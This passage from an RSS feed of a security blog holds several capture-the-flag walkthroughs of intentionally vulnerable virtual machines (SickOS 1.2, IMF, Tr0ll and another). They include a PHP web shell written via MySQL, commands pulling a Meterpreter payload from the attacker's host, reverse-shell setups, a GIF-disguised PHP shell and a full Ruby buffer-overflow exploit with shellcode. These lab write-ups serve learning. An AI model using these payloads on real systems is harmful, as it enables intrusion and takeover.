<p>With credentials and an open 3306 port, an attacker can log in and create a malicious file that would allow
remote code execution.</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; mysql -h vm -u root -p wordpress

mysql&gt;&gt; SELECT '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' INTO OUTFILE '/root/www/rce.php'
</code></pre><p><img src="https://i.imgur.com/h0gsLrZ.png" alt=""></p>
<p>With remote code execution enabled, an attacker can download a malicious payload that initiates a reverse
shell.</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint"># start a web server to host the payload
&gt;&gt; systemctl start apache2

#create the payload in the web directory
&gt;&gt; msfvenom -p php/meterpreter_reverse_tcp LPORT=443 LHOST=$HOST_IP -t raw &gt; /var/www/html/qq.php

# trigger remote commands that download the payload from the attacker's computer
&gt;&gt; curl &quot;vm/rce.php?cmd=wget 192.168.110.101/qq.php&quot;
&gt;&gt; curl &quot;vm/rce.php?cmd=ls&quot;
</code></pre><p><img src="https://i.imgur.com/5WdoFhk.png" alt=""></p>
<p>A listener/handler is configured and the reverse shell kicked off on the victim computer</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; msfconsole -x &quot;use exploit/multi/handler&quot;

msfconsole&gt;&gt; set PAYLOAD php/meterpreter_reverse_tcp
msfconsolemsfconsole&gt;&gt; set LPORT 443
msfconsole&gt;&gt; exploit -j

# start the shell
&gt;&gt; curl &quot;vm/qq.php&quot;
</code></pre><p><img src="https://i.imgur.com/Gxqwui2.png" alt=""></p>
<p>An attacker can now enumerate the contents of the victim's file system, allowing them identify any vulnerable
or mis-configured services that would allow them to elevate privileges. In this case, a cron script was
running a world-modifiable file as root.</p>
<p><img src="https://i.imgur.com/I0kuii9.png" alt="">
<img src="https://i.imgur.com/bg9dpXH.png" alt=""></p>
<p>Further inspection of this scheduled task:</p>
<p><img src="https://i.imgur.com/WXEowHC.png" alt=""></p>
<p>This task runs as the root user. All that was needed to become root was to replace the contents of the script
with a reverse shell.</p>
<p><img src="https://i.imgur.com/vFqTefn.png" alt=""></p>
<h2 id="additional-discovery">Additional Discovery</h2>
<p>SMB enumeration and unprotected shares revealed some employee names and personal notes
<img src="https://i.imgur.com/VEFkW99.png" alt=""></p>
<p>Port 666 was serving a zip file of a screenshot of another personal note. The exif contained some notes for
the attacker.
<img src="https://i.imgur.com/vJBqGGF.png" alt=""></p>
<p>The anonymous ftp login also leaks information.
<img src="https://i.imgur.com/fW3Nl8k.png" alt="">
<img src="https://i.imgur.com/aFFIp9P.png" alt=""></p>
<p>Port 80 scan initially returned what looked like a user's dotfiles. This gave me the idea that someone may be
running a web server from their home directory.
<img src="https://i.imgur.com/w3143f7.png" alt=""></p>
<p>The Wordpress site could have been used as another vector for a shell by adding a reverse shell plug-in. The
users and passwords were crackable with the rockyou word list. Some users also reused their Wordpress
passwords for their machine accounts.</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; wpscan -u https://vm:12380/blogblog/ --enumerate u
</code></pre><p><img src="https://i.imgur.com/v1GKKbb.png" alt=""></p>
<p>Without accessing the computer's <code>/etc/passwd</code> file, this gathering of information revealed the existence of
the following employees and a accounts:</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">barry
dave
elly
fred
garry
harry
heather
john
kathy
pam
peter
scott
tim
vicki
zoe
</code></pre>]]></content>
        </item>
        
        <item>
            <title>B2R: SickOSv1.2</title>
            <link>https://sec.alexflor.es/posts/2016/12/b2r-sickosv1.2/</link>
            <pubDate>Tue, 20 Dec 2016 23:45:50 -0500</pubDate>
            
            <guid>https://sec.alexflor.es/posts/2016/12/b2r-sickosv1.2/</guid>
            <description>Executive Summary This machine had an unprotected folder which allowed uploading of malicious PHP code which could then be executed remotely. An attacker could then create an unprivileged shell on the victim machine and begin to explore the system for additional vulnerabilities which could lead to a full compromise. During the exploration, an outdated version of chkrootkit was found. By exploiting a known vulnerability in the way chkrootkit parses arguments, an attacker could create a malicious file that would later be run by chkrootkit as a fully privileged user.</description>
            <content type="html"><![CDATA[<h2 id="executive-summary">Executive Summary</h2>
<p>This machine had an unprotected folder which allowed uploading of malicious PHP code which could then be
executed remotely. An attacker could then create an unprivileged shell on the victim machine and begin to
explore the system for additional vulnerabilities which could lead to a full compromise. During the
exploration, an outdated version of <code>chkrootkit</code> was found. By exploiting a known vulnerability in the way
<code>chkrootkit</code> parses arguments, an attacker could create a malicious file that would later be run by
<code>chkrootkit</code> as a fully privileged user.</p>
<h2 id="tools-used">Tools used</h2>
<ul>
<li>nmap - discovery</li>
<li>uniscan - web application scanner</li>
<li>metasploit - exploit framework</li>
<li>msfvenom - payload generation</li>
<li>local-linux-enum script - enumeration</li>
</ul>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>In order to cut down on typing, once the IP of the victim computer is discovered, it can be added to the
<code>/etc/hosts</code>.</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">echo &quot;192.168.1.188 vm&quot; &gt;&gt; /etc/hosts
</code></pre><p>We begin with scanning the victim's machine and find ports 80 and 22.</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">❯❯ nmap -p - -A vm | tee nmap.scan
</code></pre><p><img src="https://i.imgur.com/jQr872J.png" alt=""></p>
<p>Navigating to the page and checking its source code reveals nothing</p>
<p><img src="https://i.imgur.com/1Oigcfa.png" alt=""></p>
<p>Running <code>uniscan</code>, a folder named <code>test</code> is discovered</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">❯❯ uniscan -qweds -u http://vm/ 
</code></pre><p><img src="https://i.imgur.com/wU5Wp2v.png" alt=""></p>
<p>The listing appeared to be empty but further examination of the <code>/test</code> path revealed that it responded to
more than just HTTP methods. <code>COPY</code> and <code>MOVE</code> seemed to indicate WebDAV.</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">❯❯ curl -vX OPTIONS vm/test
</code></pre><p><img src="https://i.imgur.com/6GKZJbc.png" alt=""></p>
<p>This path requires no authentication and thus allows attackers to upload files to the web server.</p>
<p><img src="https://i.imgur.com/gSzuoHZ.png" alt=""></p>
<p>Verifying successful upload:</p>
<p><img src="https://i.imgur.com/CpTqKyO.png" alt=""></p>
<p>Having uploaded the reverse shell, the Meterpreter handler is constructed</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 80
run -j
</code></pre><p>&hellip;and the payload is activated.</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">curl http://vm/test/sshhh.php
</code></pre><p><img src="https://i.imgur.com/XQ3a9Q4.png" alt=""></p>
<p>Once a shell has been established on the system, an enumeration script reveals what additional
vulnerabilities might lead to a full compromise.</p>
<p>The installed version of <code>chkrootkit</code> is outdated and vulnerable to a code execution exploit.</p>
<p><img src="https://i.imgur.com/EJSijYp.png" alt=""></p>
<p>The ExploitDB gives the following description:</p>
<p><img src="https://i.imgur.com/uVIlbic.png" alt=""></p>
<p>Using Metasploit, we create another handler and payload, using the <code>chkrootkit</code> module. This module will
create/overwrite the <code>/tmp/update</code> file with the reverse tcp shell of your choosing. The next time
<code>chkrootkit</code> is run, this update file will connect back to the attacker computer designated in the payload.</p>
<p><img src="https://i.imgur.com/9GKQfrW.png" alt=""></p>
]]></content>
        </item>
        
        <item>
            <title>B2R: IMF Walkthrough</title>
            <link>https://sec.alexflor.es/posts/2016/11/b2r-imf-walkthrough/</link>
            <pubDate>Tue, 01 Nov 2016 19:16:02 -0400</pubDate>
            
            <guid>https://sec.alexflor.es/posts/2016/11/b2r-imf-walkthrough/</guid>
            <description>After mapping the network and finding our IP address at 192.168.1.162, we can add it to our /etc/hosts temporarily to make things a little easier for us.
echo &amp;quot;192.168.1.162 imf&amp;quot; &amp;gt;&amp;gt; /etc/hosts Lets see what kind of machine we&#39;re dealing with.
Ok, so web only. Great. nikto didn&#39;t reveal any low-hanging fruit so let&#39;s dive into the source.
Check that out! Our first flag was hidden in http://imf/contact.php. This looks like base64.</description>
            <content type="html"><![CDATA[<p>After mapping the network and finding our IP address at <code>192.168.1.162</code>, we can add it to our <code>/etc/hosts</code>
temporarily to make things a little easier for us.</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">echo &quot;192.168.1.162     imf&quot; &gt;&gt; /etc/hosts
</code></pre><p>Lets see what kind of machine we're dealing with.</p>
<p><img src="https://i.imgur.com/1DmhXnq.png" alt=""></p>
<p>Ok, so web only. Great. <code>nikto</code> didn't reveal any low-hanging fruit so let's dive into the source.</p>
<p><img src="https://i.imgur.com/S4hPuB2.png" alt=""></p>
<p>Check that out! Our first flag was hidden in <code>http://imf/contact.php</code>. This looks like base64. After decoding
we get the clue <code>allthefiles</code>. Lets keep looking.</p>
<p>Going back to the source code, I found a javascript file that also looked like it was base64 but it didn't
return any results. After a while of going in circles I took my dog for a walk and pondered about what
&lsquo;allthefiles&rsquo; could mean. When I came back and looked over the source code again, I saw this:</p>
<p><img src="https://i.imgur.com/ANZ1UgC.png" alt=""></p>
<p>All the files, ey?</p>
<p><img src="https://i.imgur.com/Ik1rUga.png" alt=""></p>
<p>If we visit that directory on our webapp</p>
<p><img src="https://i.imgur.com/75xqVVJ.png" alt=""></p>
<p>Ok, no DB here. We're dealing with a hardcoded password which means we're dealing with an equaltiy operator
on the backend or possibly the <code>strcmp()</code> function. I messed around with nullbyte string termination exploits
here for a while but ultimately ended up nowhere. Let's assume we're dealing with <code>strcmp</code> since it's easier
to fool a function than to fool an operator.</p>
<p><img src="https://i.imgur.com/qo8t92C.png" alt=""></p>
<p>I'm not very good with PHP, but I'm guessing that I need this function to return a <code>0</code> so I fired up
<a href="https://repl.it">repl.it</a> and started trying to break it. Turns out if you feed it the wrong type (it
expects two strings), it seems to return a <code>0</code>.</p>
<p><img src="https://i.imgur.com/iQiFPrC.png" alt=""></p>
<p>So if we can feed this function an array from the web form, we might be able to bypass the password check. By
changing the name of the form's password field from <code>pass</code> to <code>pass[]</code>, we can do just that.</p>
<p><img src="https://i.imgur.com/DpxX4o7.png" alt=""></p>
<p>With the modified form, a BS password, and a username from the Contacts page, we get&hellip;</p>
<p><img src="https://i.imgur.com/wB0UUP3.png" alt=""></p>
<p>The decoded flag just has us click through to the CMS</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">root@kali:~                                                                                                                                                                                     ⍉
❯❯ echo Y29udGludWVUT2Ntcw== | base64 -d
continueTOcms
</code></pre><p>The CMS has 3 pages to choose from and none of them seemed to have any relevant info. I tried (too long) to
use LFI exploits here, modifying URLs, headers, HTTP methods&hellip; nothing. I was trying to enter an empty
<code>pagename</code> for like the 100th time when I fat fingered the &ldquo;enter&rdquo; key and hit <code>' + Enter</code> at the same time
when I saw this:</p>
<p><img src="https://i.imgur.com/Oqo4ZQg.png" alt=""></p>
<p>SQL! Alright, fired up <code>sqlmap</code></p>
<p><img src="https://i.imgur.com/izezAtP.png" alt="">
<img src="https://i.imgur.com/uckNUTe.png" alt=""></p>
<p>Looks like we have an image at <code>imfadministrator/images/whiteboard.jpg</code></p>
<p><img src="https://i.imgur.com/BBLfAQY.png" alt=""></p>
<p>The QR Code is our next flag <code>flag4{dXBsb2FkcjkOMi5waHA=}</code></p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">root@kali:~                                                                                                                                                                                     ⍉
❯❯ echo dXBsb2Fkcjk0Mi5waHA= | base64 -d
uploadr942.php   
</code></pre><p>We navigate to <code>http://imf/imfadministrator/uploadr942.php</code> and we get our uploader. After messing around
with it a bit we can see that the response html from a successful upload has a hash of some sort. I'm
guessing its the hashed version of the filename in the <code>/uploads</code> folder.</p>
<p>Maybe we can craft a malicious image with a reverse_tcp meterpreter payload then insert the new page into our
db so it gets executed.</p>
<p><img src="https://i.imgur.com/y8obNV4.png" alt=""></p>
<p>Let's upload it!</p>
<p><img src="https://i.imgur.com/ePzjKU9.png" alt=""></p>
<p>Haha! Whoops. Alright what about just regular command execution:</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">cat &lt;&lt;EOF &gt; muahaha.gif
GIF89a
&lt;?php \`id\` ?&gt;
</code></pre><p>Since CrappyWAF detects functions calls, we should modify our script to take the command from a query
parameter. Let's replace <code>id</code> with <code>$cmd=$_GET['cmd']; echo $cmd</code> and try again.</p>
<p><img src="https://i.imgur.com/v0uaGPw.png" alt=""></p>
<p>Lets get a shell that's easier to work with with <code>msfvenom</code>.</p>
<p><img src="https://i.imgur.com/lXrjIik.png" alt="">
<img src="https://i.imgur.com/dRelPbw.png" alt=""></p>
<p>It's time to get a sense of the machine we're in. &ldquo;Presence&rdquo;</p>
<ul>
<li>interesting processes - knockd, sshd</li>
<li>interesting files (world readable, executable root files, etc) - <code>/usr/local/bin</code>
<ul>
<li><code>cat /usr/local/bin/access_codes #&gt; SYN 7482,8279,9467</code></li>
<li><code>/usr/local/bin/agent</code> - connect to some sort of agent portal; download it</li>
</ul>
</li>
<li>listening ports <code>netstat -plnt</code> - 7788</li>
</ul>
<p>It looks like we've got a hidden service running on 7788. To enable it, we have to &lsquo;knock&rsquo; in the right order
so the firewalll opens up. If we send SYN packets to 7482 8279 9467, it might open up.</p>
<p><img src="https://i.imgur.com/SgDQYRk.png" alt="">
<img src="https://i.imgur.com/SdM3380.png" alt=""></p>
<p>Lets decompile our downloaded binary at <a href="https://retdec.com/decompilation-run/">https://retdec.com/decompilation-run/</a></p>
<p><img src="https://i.imgur.com/WnuLN8R.png" alt=""></p>
<p>We can see on line 49 where the authentication happens. It's comparing against a string that was defined on
line 37, <code>0x2ddd984</code>. If we pop this into an online hex converter, we get <code>48093572</code></p>
<p><img src="https://i.imgur.com/rs6S3Yf.png" alt=""></p>
<p>After navigating through our binary, we have a place where we have user input. This is looking like it's
going to be a buffer overflow exploit. Once we download our application and run it through <code>gdb</code>, we confirm
that the report function is vulnerable.</p>
<p><img src="https://i.imgur.com/4CxBLoX.png" alt="">
<img src="https://i.imgur.com/bD9RCyw.png" alt=""></p>
<p>Bingo. Plug 0x41366641 into <code>pattern_offset</code> we see that our buffer ends at 168, meaning our EIP register is
at 169. If we inspect the assembly for the <code>report</code> function, we see that our report string is stored in EAX.
Because we have control of both EIP and EAX, it makes sense that we use this control to point one to the
other. We can place our exploit at the beginning of EAX by simply injecting it as the &ldquo;report&rdquo;. We'll then
pad the input string until it's 168 characters long. Then, well tell EIP that it should return to the
beginning of EAX where our payload is waiting.  If we search to see if EAX is ever called, we can use that
address in EIP.</p>
<p><img src="https://i.imgur.com/R7BFi8b.png" alt="">
<img src="https://i.imgur.com/3yWsjBr.png" alt=""></p>
<p>Lets generate our shellcode and start to write the exploit.</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.161 LPORT=4444 -f ruby -b &quot;\x00\x0a\x0d&quot;
</code></pre><pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">require 'socket'

host = '192.168.1.162'

if ARGV[0] == 'knock'
  [7482, 8279, 9467].each do |port|
    puts &quot;knocking on #{port}&quot;
    `nmap -Pn --host_timeout 201 --max-retries 0 -p #{port} #{host} &amp;&gt;/dev/null`
  end
end

buf = 
&quot;\xda\xd4\xd9\x74\x24\xf4\x58\xbb\xc8\x28\xf5\xc3\x29\xc9&quot; +
&quot;\xb1\x12\x31\x58\x1a\x83\xc0\x04\x03\x58\x16\xe2\x3d\x19&quot; +
&quot;\x2e\x34\x5e\x09\x93\xe8\xca\xac\xa3\x69\x83\x50\x0e\xf5&quot; +
&quot;\x04\xc9\xf9\x36\x82\xef\x58\xde\xd0\xef\x8b\x43\x5d\x0e&quot; +
&quot;\xc1\x1d\x05\x81\x47\xb5\x3c\xc0\x2b\xf4\xbe\xb1\xab\xbf&quot; +
&quot;\xbe\xa5\xb3\xbf\x37\x26\x72\x54\x4b\x68\x96\xa7\xe3\x17&quot; +
&quot;\x94\x38\x58\x61\xc7\xa0\xe8\x7d\xb8\xd0\xd9\xfe\x47\x37&quot;

eip = &quot;\x63\x85\x04\x08&quot;

exploit = buf + &quot;A&quot;*70 + eip

s = TCPSocket.new(host, 7788)
puts s.readpartial(512)
s.write(&quot;48093572\n&quot;)

puts s.readpartial(512)
s.write(&quot;3\n&quot;)

puts s.readpartial(512)
s.write(exploit + &quot;\n&quot;)
</code></pre><p>Let's run it!</p>
<p><img src="https://i.imgur.com/ImmvfQj.png" alt=""></p>
<p>And there we have it! Thanks for reading!</p>
]]></content>
        </item>
        
        <item>
            <title>B2R: Tr0ll Walkthrough</title>
            <link>https://sec.alexflor.es/posts/2016/10/b2r-tr0ll-walkthrough/</link>
            <pubDate>Thu, 20 Oct 2016 20:57:00 -0400</pubDate>
            
            <guid>https://sec.alexflor.es/posts/2016/10/b2r-tr0ll-walkthrough/</guid>
            <description>A couple of weeks ago, work sent me to a security class for an upcoming product. While there, I learned about vulnhub, a repository of intentionally vulnerable virtual machines for anyone to compromise. Since coming back, vulnhub has become my new obsession. Here&#39;s a walkthrough of my attempt.
Note: I struggled a bit more that this writeup lets on. The struggle is ommited for clarity and brevity.
__
After finding the VM with an nmap scan, we see a couple of open ports.</description>
            <content type="html"><![CDATA[<p>A couple of weeks ago, work sent me to a security class for an upcoming product. While there, I learned about
<a href="https://vulnhub.com">vulnhub</a>, a repository of intentionally vulnerable virtual machines for anyone to
compromise. Since coming back, vulnhub has become my new obsession. Here's a walkthrough of my attempt.</p>
<p><em>Note: I struggled a bit more that this writeup lets on. The struggle is ommited for clarity and brevity.</em></p>
<p>__</p>
<p>After finding the VM with an nmap scan, we see a couple of open ports.</p>
<p><img src="images/Screenshot2016-10-2100:03:55.png" alt=""></p>
<p>Upon browsing to the web page, we're greeted with our good friend, the troll.</p>
<p><img src="images/Screenshot2016-10-2111:10:57.png" alt=""></p>
<p>With the CTFs I've done so far, I've run <code>nikto</code> or <code>uniscan</code>, to find useful information about the site.
There's almost always a <code>robots.txt</code> file. Let's start there.</p>
<p><img src="images/Screenshot2016-10-2111:15:06.png" alt=""></p>
<p>OK, so another troll face. Uniscan and Nikto brought up nothing either. I guess it's off to the FTP service
then.</p>
<p>I run <code>nmap -A</code> against the FTP port and see that I get a name and version number. Searchsploit doesn't turn
up anything useful so I try to log in as an anonymous user and bingo; next clue.</p>
<p><img src="images/Screenshot2016-10-2111:20:43.png" alt=""></p>
<p>Let's take a look at what's inside (superfluous <code>grep</code> added for display purposes)</p>
<p><img src="images/Screenshot2016-10-2111:44:15.png" alt=""></p>
<p>So we get the string &lsquo;sup3rs3cr3tdirlol&rsquo;. Navigating there gets a directory listing with one file. Let's
download it.</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">$&gt; curl -L 192.168.110.103/sup3rs3cr3tdirlol/roflmao
$&gt; file roflmao
# shows it's a binary file

$&gt; strings roflmao
# ..snip..
# Find address 0x0856BF to proceed
# ..snip..
</code></pre><p>During CTFs I usually append unique words I run into to a dictionary so I can either use them for brute force
attacks or for enumerating web directories with a tool like <code>dirbuster</code>. It wasn't very long at this point
and given the trolling nature of this challenge so far I thought maybe I should take our string's words
literally. That, and it wasn't a real memory address at only 3 bytes long.</p>
<p><img src="images/Screenshot2016-10-2112:04:00.png" alt=""></p>
<p>Awesome! I downloaded the files which had what looked like usernames and a single password. One folder was
called &lsquo;this_folder_contains_the_password&rsquo;. Again, taking things literally, I made a quick and dirty script
to take all the words in this folder and append them to my wordlist.</p>
<pre><code class="language-ruby.prettyprint" data-lang="ruby.prettyprint">require 'nokogiri'
require 'open-uri'

url = 'http://192.168.110.103/0x0856BF/this_folder_contains_the_password'
data = open(url).read
page = Nokogiri::HTML(data)

def print_tree(node, list = [])
  return list if node.children.empty?
  node.children.inject(list) do |memo, child|
    text = child.text.split(&quot; &quot;).map(&amp;:strip) unless child.text.nil?
    memo.push(*text) if text
    print_tree(child, memo)
  end
end

puts print_tree(page).to_a.sort.uniq
</code></pre><pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ruby scrape.rb &gt;&gt; word.list
</code></pre><p>This seemed like a good time to attack the ssh port with <code>hydra</code> and our new lists. After a couple of
attempts, the SSH port stopped letting me try to authenticate. I went through the attack again, reversing the
user list, password list, then both, waiting for the ssh port to reset between attempts. And then&hellip;</p>
<p><img src="images/Screenshot2016-10-2113:45:29.png" alt=""></p>
<p>Once we're logged in, we're immediately kicked off and we see the following message:</p>
<p><img src="images/Screenshot2016-10-2113:50:33.png" alt=""></p>
<p>OK, after a few more logons, I notice it happens every 5 minutes&hellip; cron job.</p>
<p>In the meantime, I uploaded an enumeration script to <code>/tmp</code>, but notice that it also gets deleted about every
2 minutes. Another cron job?</p>
<p>I tried to manually see if there were any SUID binaries to exploit or any world-writable files</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">find / --perm 6000
find / --perm 0777
</code></pre><p>There are! It's a long list but 1 stands out: <code>/lib/log/cleaner.py</code> The contents of the file looks
like it wipes the <code>/tmp</code> directory. This must be the file that <code>cron</code> runs.</p>
<p><img src="images/Screenshot2016-10-2113:54:51.png" alt=""></p>
<p>Thank goodness it's writable ;) I I start a meterpreter listener and replace the <code>cleaner.py</code> contents with a
stager.</p>
<p><img src="images/Screenshot2016-10-2114:03:47.png" alt=""></p>
<p>Since the owner of the <code>cleaner.py</code> file was root, and the meterpreter stager was now the contents of the
file&hellip;</p>
<p><img src="images/Screenshot2016-10-2114:04:41.png" alt=""></p>
<p>Now we can take a look at the cron jobs to see what was trolling us and also at the flag</p>
<p><img src="images/Screenshot2016-10-2114:11:12.png" alt=""></p>
<p>There we have it! This was so fun! CTF VMs have completely replaced video games for me.</p>
]]></content>
        </item>
        
    </channel>
</rss>
